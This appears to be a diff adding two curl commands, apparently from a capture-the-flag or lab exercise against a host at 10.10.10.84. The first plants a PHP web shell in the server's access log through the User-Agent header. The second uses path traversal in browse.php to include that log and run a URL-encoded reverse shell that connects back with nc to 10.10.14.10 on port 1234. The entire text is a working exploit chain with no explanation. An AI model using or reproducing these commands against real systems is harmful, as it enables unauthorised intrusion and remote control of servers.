@@ -1,0 +1,2 @@
+curl "http://10.10.10.84/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
+curl "http://10.10.10.84/browse.php?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fhttpd-access.log&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.10%201234%20%3E%2Ftmp%2Ff" -s | grep '] "GET / HTTP/1.1" 200 289 "-" "' | tail -n 1 | awk -F '"-"' '{print $2}' | sed "s/\"//g"
